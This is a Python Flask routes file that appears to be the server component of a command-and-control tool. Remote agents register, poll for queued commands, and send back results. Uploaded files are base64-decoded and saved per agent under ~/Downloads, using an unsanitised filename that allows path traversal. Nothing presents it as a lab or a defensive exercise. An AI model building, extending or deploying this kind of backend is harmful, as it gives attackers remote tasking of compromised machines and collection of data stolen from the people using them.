import time
import json
import base64
import os
import platform
import uuid
from flask import request, jsonify
from queue import Queue

from lib.config import (
    agents, tasks, results, result_queues,
    AUTH_KEY, AGENT_TIMEOUT
)

def auth_check(req):
    return req.headers.get("Authorization") == f"Bearer {AUTH_KEY}"

def timestamp():
    return time.strftime("%Y-%m-%d %H:%M:%S")

def save_file(agent_id, filename, b64data):
    data = base64.b64decode(b64data)
    downloads = os.path.expanduser("~/Downloads")
    agent_dir = os.path.join(downloads, agent_id)
    os.makedirs(agent_dir, exist_ok=True)
    path = os.path.join(agent_dir, filename)
    with open(path, "wb") as f:
        f.write(data)
    return path

def create_routes(app):

    @app.route("/register", methods=["POST"])
    def register():
        if not auth_check(request):
            return "Unauthorized", 401

        aid = str(uuid.uuid4())

        agents[aid] = {
            "registered_at": timestamp(),
            "last_seen": time.time()
        }
        tasks[aid] = Queue()
        results[aid] = []
        result_queues[aid] = Queue()     # LIVE STREAM QUEUE

        return jsonify({"agent_id": aid})

    @app.route("/task/<agent_id>", methods=["GET"])
    def get_task(agent_id):
        if not auth_check(request):
            return "Unauthorized", 401

        if agent_id not in agents:
            return "Unknown agent", 404

        agents[agent_id]["last_seen"] = time.time()

        if not tasks[agent_id].empty():
            return jsonify({"task": tasks[agent_id].get()})

        return jsonify({"task": None})

    @app.route("/task/<agent_id>", methods=["POST"])
    def post_task(agent_id):
        if not auth_check(request):
            return "Unauthorized", 401
        if agent_id not in agents:
            return "Unknown agent", 404

        if time.time() - agents[agent_id]["last_seen"] > AGENT_TIMEOUT:
            return "Agent offline", 400

        tasks[agent_id].put(request.data.decode())
        return "OK", 200

    @app.route("/result/<agent_id>", methods=["POST"])
    def receive_result(agent_id):
        if not auth_check(request):
            return "Unauthorized", 401
        if agent_id not in agents:
            return "Unknown agent", 404

        raw = request.data.decode()

        try:
            parsed = json.loads(raw)
            if parsed.get("type") == "file":
                saved = save_file(agent_id, parsed["filename"], parsed["data"])
                readable = f"[FILE SAVED] {saved}"
            else:
                readable = raw
        except:
            readable = raw

        entry = {"timestamp": timestamp(), "result": readable}

        # Store in history
        results[agent_id].append(entry)

        # Push to live-output queue
        result_queues[agent_id].put(entry)

        return "OK", 200

    @app.route("/agents", methods=["GET"])
    def list_agents():
        if not auth_check(request):
            return "Unauthorized", 401

        live = [
            aid for aid, info in agents.items()
            if time.time() - info["last_seen"] <= AGENT_TIMEOUT
        ]
        return jsonify({"agents": live})

    @app.route("/history/<agent_id>", methods=["GET"])
    def history(agent_id):
        if not auth_check(request):
            return "Unauthorized", 401
        if agent_id not in agents:
            return "Unknown agent", 404
        return jsonify({"results": results[agent_id]})
